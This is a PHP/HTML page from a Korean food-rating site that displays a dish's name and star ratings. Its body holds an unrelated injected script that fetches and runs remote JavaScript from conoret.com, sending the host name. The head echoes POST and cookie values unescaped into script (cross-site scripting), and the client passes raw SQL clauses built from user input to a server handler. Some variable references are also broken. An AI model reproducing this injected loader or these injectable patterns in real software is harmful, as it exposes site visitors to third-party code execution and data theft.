<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/5.2/assets/css/docs.css" rel="stylesheet">
    <title>ssosso-table.food-foodinfo</title>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>

    <link rel="icon" href="src/favicon.ico">


    <style>
        @font-face { /* 애플산돌고딕 폰트 적용 */
            font-family: "Jua";
            src: url("css/font/Jua-Regular.ttf") format("truetype");
            font-weight: normal;
        }
        html,
        body {
            font-family: Jua;
            height: 100%;
            overflow-y:scroll !important;
        }
        body {
            display: flex;
            align-items: center;
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #f5f5f5;
            color: #2c3034;
        }
        header {
            width: 550px;
        }
        .nav-link {
            font-weight: 300 !important;
        }
        .nav-masthead .active {
            color: #2c3034;
            border-bottom-color: transparent;
        }
        a:focus, a:hover {
            border-bottom-color: #2c3034 !important;
            color: #2c3034 !important;
        }
        p {
            color: #2c3034 !important;
        }
        html::-webkit-scrollbar {
            display: none;  /* Safari and Chrome */
        }
        body {
            padding:0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;

        }
        .cover-container {
            padding:0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;
        }
        main {
            padding: 0!important;
            margin: 0!important;
            height: 100%;
            width: 100%;
            overflow-y: auto;
        }
        .card {
            width: 100% !important;
            height: 100% !important;
        }
        nav {
            background-color:#ffebaa;
            padding: 0!important;
            height: 100%!important;
        }
        .cover-container {
            max-width: 100%;
            width: 100%;
            padding-left: 0!important;
            padding-right: 0!important;
            margin: 0!important;
        }
        .box {
            width: 300px;
            height: 300px;
            border-radius: 30%;
            overflow: hidden;
            margin: auto;
        }
        .profile {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
    </style>
    <link rel="stylesheet" href="/css/footer.css">
    <link rel="stylesheet" href="/css/header.css">

    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script>
        const food_name= <?php echo $_POST['food_name']."\n"; ?>
        const user_id=<?php echo $_COOKIE['user_id']."\n"; ?>

        let food_id
        let init_trait
        let traits
        let trait_keys
        let userProfile
        let info
        let info_keys
        function getScore() {
            let width=parseInt(arguments[1])/2
            let height=parseInt(arguments[1])

            switch (parseInt(arguments[0])) {
                case 0:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 1:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 2:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 3:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 4:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 5: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 6: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 7: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 8: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}">`
                case 9: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}">`
                default:
                    break
            }
        }

        async function set_user_profile() {
            userProfile.userId=user_id

            info=JSON.parse(await $.ajax({
                type: "POST",
                url: 'http://ssossotable.com/script/php/JSONHandler.php',
                data:{
                    'path':'http://ssossotable.com/database/user_profile_lasso.json'
                }}))
            info_keys=Object.keys(info)
            for(let i=0; i < keys.length; i++) {
                userProfile[keys[i]]=info[keys[i]][userProfile.userId]
            }
        }
        async function set_food_traits() {
            init_trait=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data:{
                    0:'select',
                    1:"*",
                    2:"trait",
                    3:`id=${food_id}`
                }}))
            traits={}
            for(let i=0;i<init_traits.length;i++) {
                let idx=init_traits[i][0]
                traits[idx]={
                    korean:init_traits[i][1],
                    japanese:init_traits[i][2],
                    chinese:init_traits[i][3],
                    western:init_traits[i][4],
                    fried:init_traits[i][5],
                    grilled:init_traits[i][6],
                    soup:init_traits[i][7],
                    stir_fried:init_traits[i][8],
                    raw:init_traits[i][9],
                    steamed:init_traits[i][10],
                    beverage:init_traits[i][11],
                    asian:init_traits[i][12],
                    sweetness:init_traits[i][13],
                    sour_taste:init_traits[i][14],
                    spicy:init_traits[i][15],
                    noodle:init_traits[i][16],
                    seafood:init_traits[i][17],
                    meat:init_traits[i][18],
                    vegetable:init_traits[i][19],
                    spice:init_traits[i][20],
                    rice:init_traits[i][21],
                    dessert:init_traits[i][22],
                    wheat:init_traits[i][23],
                    soda:init_traits[i][24],
                    slimy:init_traits[i][25],
                    fruit:init_traits[i][26]
                }
                if(i===init_traits.length-1) {
                    trait_keys=Object.keys(traits[idx])
                }
            }
        }

        async function init() {
            const food_info=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0: 'select',
                    1: '*',
                    2: 'food',
                    3: `food.name='${food_name}';`
                }
            }))
            document.getElementById('food-name').innerText=food_name
        }
    </script>
    <script type="text/javascript" src="/script/javascript/modules.js"></script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>

<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
    <nav id="nav" class="navbar d-flex">
        <a class="navbar-brand p-2" href="http://ssossotable.com/recommendation.php" style="margin-right: auto;"><img class="masthead-brand" src="src/logo.png" width="64px" height="64px"></a>
        <a class="nav-link active p-2" href="http://ssossotable.com/rating.php">음식 평가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/recipe.php">레시피 추가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/record.php">식사 기록하기</a>
        <button style="margin: 10px;" class="navbar-toggler p-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
            <div class="offcanvas-header">
                <a  class="offcanvas-title" href="http://ssossotable.com/recommendation.php"><img class="masthead-brand" src="src/logo.png" width="48px" height="48px"></a>
                <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body">
                <ul class="navbar-nav justify-content-end flex-grow-1 pe-3" style="text-align: left;">
                    <li class="nav-item">
                        <a class="nav-link " href="http://ssossotable.com/myInfo.php">내 정보</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/friends.php">친구 목록</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/diary.php">다이어리</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/my-recipe.php">나만의 레시피북</a>
                    </li>
                </ul>
                <div class="input-group mb-3 mt-3">
                    <input id="search" type="text" class="form-control" placeholder="음식명을 넣어주세요" aria-label="Recipient's username" aria-describedby="button-addon2">
                    <button onclick="search()" class="btn btn-outline-secondary" type="button" id="button-addon2">검색</button>
                </div>
            </div>
        </div>
    </nav>

    <main role="main" class="inner cover" id="rating_main"  style="">
        <div class="card">
            <div class="card-body" id="title">
                <div class="box">
                    <img class="profile" src="/src/food_placeholder.png"/>
                </div>
                <h1 class="card-title" id="food-name">음식 이름</h1>
            </div>
            <div id="rating">
            </div>
        </div>
    </main>

    <footer id="footer"  class="mastfoot mt-auto" style="background-color:#ffebaa;">
        <div class="inner">
            <p style="margin: 0;">Created by<a href="http://ssossotable.com" class="footer-link"> ssosso.table.u</a>, of <a href="http://ssossotable.com" class="footer-link">@ssosso.table</a></p>
        </div>
    </footer>
</div>
<script>
    init()
</script>
</body>
</html>